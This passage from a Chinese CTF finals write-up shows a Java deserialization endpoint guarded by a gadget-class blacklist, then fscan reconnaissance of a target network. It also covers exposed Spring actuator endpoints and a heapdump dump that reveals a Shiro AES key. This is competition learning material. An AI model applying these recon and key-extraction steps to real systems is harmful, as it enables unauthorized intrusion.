string">"msg"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token string">"/api"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> model<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/*     * WARNING - Removed try catching itself - possible behaviour change.     */</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/log"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> filePath <span class="token operator">=</span> <span class="token string">"./logs/solon.log"</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> line<span class="token punctuation">;</span>            reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">lineSeparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>reader <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    reader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/api"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Post</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">api</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Context</span> ctx<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> jsonObject<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span><span class="token class-name">DemoController</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token constant">WHITELISTED_CLASSES</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token constant">BLACKLISTED_CLASSES</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#123;</span>                <span class="token comment">// Add classes to the whitelist</span>                <span class="token constant">WHITELISTED_CLASSES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.example.demo.User"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// Add other safe classes here</span>                <span class="token comment">// Add classes to the blacklist</span>                <span class="token constant">BLACKLISTED_CLASSES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.collections.functors.InvokerTransformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token constant">BLACKLISTED_CLASSES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.collections.Transformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token constant">BLACKLISTED_CLASSES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token constant">BLACKLISTED_CLASSES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// Add other dangerous classes here</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">String</span> className <span class="token operator">=</span> desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// Check if the class is blacklisted</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">BLACKLISTED_CLASSES</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Deserialization of class "</span> <span class="token operator">+</span> className <span class="token operator">+</span> <span class="token string">" is not allowed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token comment">// Check if the class is whitelisted</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">WHITELISTED_CLASSES</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Deserialization of class "</span> <span class="token operator">+</span> className <span class="token operator">+</span> <span class="token string">" is not allowed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Fobee（Unsolved）"><a href="#Fobee（Unsolved）" class="headerlink" title="Fobee（Unsolved）"></a>Fobee（Unsolved）</h2><p>没看</p><hr><h1 id="Pwn-PHP（Unsolved）"><a href="#Pwn-PHP（Unsolved）" class="headerlink" title="Pwn-PHP（Unsolved）"></a>Pwn-PHP（Unsolved）</h1><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721224758509.png" alt="image-20240721224758509"></p><p>CVE-2024-2961？</p><p>fix貌似把iconv的so文件扬了就行</p><hr><h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>我不会渗透也没打过云境，内网代理还是前一天现学的，但是根本没建立起一个内网代理的思路，代理还是等巨魔从酒店拿拓展坞回来才开张的（</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721140100586.png" alt="image-20240721140100586"></p><p>传fscan到vps扫一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@vps:~<span class="token comment"># ./fscan -h 192.168.36.88/24</span>   ___                              _      / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __  / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ // /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>    <span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>                        fscan version: <span class="token number">1.8</span>.3start infoscan<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">192.168</span>.36.88   is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">192.168</span>.36.253  is alive<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: <span class="token number">2</span><span class="token number">192.168</span>.36.88:22 <span class="token function">open</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后扫erp</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">8.130</span>.44.201   ___                              _  / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __ / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ // /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span><span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>                     fscan version: <span class="token number">1.8</span>.3start infoscan<span class="token number">8.130</span>.44.201:8080 <span class="token function">open</span><span class="token number">8.130</span>.44.201:22 <span class="token function">open</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: <span class="token number">2</span>start vulscan<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080  code:302 len:0      title:None 跳转url: http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE code:200 len:1383   title:Master ERP login Form<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-spring-actuator-heapdump-file<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-springboot-env-unauth spring2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ERP"><a href="#ERP" class="headerlink" title="ERP"></a>ERP</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080  code:302 len:0      title:None 跳转url: http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE code:200 len:1383   title:Master ERP login Form<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-spring-actuator-heapdump-file<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-springboot-env-unauth spring2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>存在敏感信息泄露，访问<code>/actuator/env</code>可以读到配置信息</p><p><code>/actuator/heapdump</code>可以导出堆内存信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">java</span> <span class="token parameter variable">-jar</span> JDumpSpider-1.1-SNAPSHOT-full.jar heapdumpLoading heap dump heapdump from cache failed.java.io.IOException: HPROF <span class="token function">time</span> mismatch. Cached <span class="token number">1698502789924</span> from heap dump <span class="token number">1721521747178</span>        at org.graalvm.visualvm.lib.jfluid.heap.HprofHeap.<span class="token operator">&lt;</span>init<span class="token operator">></span><span class="token punctuation">(</span>HprofHeap.java:385<span class="token punctuation">)</span>        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.loadHeap<span class="token punctuation">(</span>HeapFactory.java:96<span class="token punctuation">)</span>        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.createHeap<span class="token punctuation">(</span>HeapFactory.java:79<span class="token punctuation">)</span>        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.createHeap<span class="token punctuation">(</span>HeapFactory.java:55<span class="token punctuation">)</span>        at org.graalvm.visualvm.lib.jfluid.heap.GraalvmHeapHolder.<span class="token operator">&lt;</span>init<span class="token operator">></span><span class="token punctuation">(</span>GraalvmHeapHolder.java:18<span class="token punctuation">)</span>        at cn.wanghw.Main.call<span class="token punctuation">(</span>Main.java:66<span class="token punctuation">)</span>        at cn.wanghw.Main.main<span class="token punctuation">(</span>Main.java:29<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>SpringDataSourceProperties-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>WeblogicDataSourceConnectionPoolConfig-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>MongoClient-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>AliDruidDataSourceWrapper-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>HikariDataSource-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>RedisStandaloneConfiguration-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>JedisClient-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>CookieRememberMeManager<span class="token punctuation">(</span>ShiroKey<span class="token punctuation">)</span>-------------algMode <span class="token operator">=</span> GCM, key <span class="token operator">=</span> 0f+dthGML0M572/nBElv8g<span class="token operator">==</span>, algName <span class="token operator">=</span> AES<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>OriginTrackedMapPropertySource-------------management.endpoints.web.exposure.include <span class="token operator">=</span> *spring.thymeleaf.encoding <span class="token operator">=</span> UTF-8management.endpoint.health.show-details <span class="token operator">=</span> alwaysspring.thymeleaf.cache <span class="token operator">=</span> <span class="token boolean">true</span>spring.thymeleaf.content-type <span class="token operator">=</span> text/htmlserver.port <span class="token operator">=</span> <span class="token number">8080</span>spring.thymeleaf.check-template <span class="token operator">=</span> <span class="token boolean">true</span>management.endpoints.jmx.exposure.include <span class="token operator">=</span> *<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>MutablePropertySources-------------awt.toolkit <span class="token operator">=</span> sun.awt.X11.XToolkitsun.boot.class.path <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs <span class="token operator">=</span> org.springframework.boot.loadersun.management.compiler <span class="token operator">=</span> HotSpot <span class="token number">64</span>-Bit Tiered Compilerssun.cpu.isalist <span class="token operator">=</span>sun.jnu.encoding <span class="token operator">=</span> UTF-8java.runtime.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412-8u412-ga-1~20.04.1-b08java.class.path <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jarpath.separator <span class="token operator">=</span> <span class="token builtin class-name">:</span>java.vm.vendor <span class="token operator">=</span> Private Buildos.version <span class="token operator">=</span> <span class="token number">5.4</span>.0-187-genericjava.endorsed.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedjava.runtime.name <span class="token operator">=</span> OpenJDK Runtime Environmentfile.encoding <span class="token operator">=</span> UTF-8catalina.useNaming <span class="token operator">=</span> <span class="token boolean">false</span>spring.beaninfo.ignore <span class="token operator">=</span> <span class="token boolean">true</span>java.vm.specification.version <span class="token operator">=</span> <span class="token number">1.8</span>os.name <span class="token operator">=</span> Linuxjava.vm.name <span class="token operator">=</span> OpenJDK <span class="token number">64</span>-Bit Server VMlocal.server.port <span class="token operator">=</span> nulluser.country <span class="token operator">=</span> USjava.vendor.url.bug <span class="token operator">=</span> http://bugreport.sun.com/bugreport/sun.java.command <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jarjava.io.tmpdir <span class="token operator">=</span> /tmpcatalina.home <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528java.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412user.home <span class="token operator">=</span> /rootuser.language <span class="token operator">=</span> enPID <span class="token operator">=</span> <span class="token number">589</span>java.awt.printerjob <span class="token operator">=</span> sun.print.PSPrinterJobCONSOLE_LOG_CHARSET <span class="token operator">=</span> UTF-8file.separator <span class="token operator">=</span> /catalina.base <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528java.vm.info <span class="token operator">=</span> mixed modejava.specification.name <span class="token operator">=</span> Java Platform API Specificationjava.vm.specification.vendor <span class="token operator">=</span> Oracle CorporationFILE_LOG_CHARSET <span class="token operator">=</span> UTF-8java.awt.graphicsenv <span class="token operator">=</span> sun.awt.X11GraphicsEnvironmentjava.awt.headless <span class="token operator">=</span> <span class="token boolean">true</span>sun.io.unicode.encoding <span class="token operator">=</span> UnicodeLittlejava.ext.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token 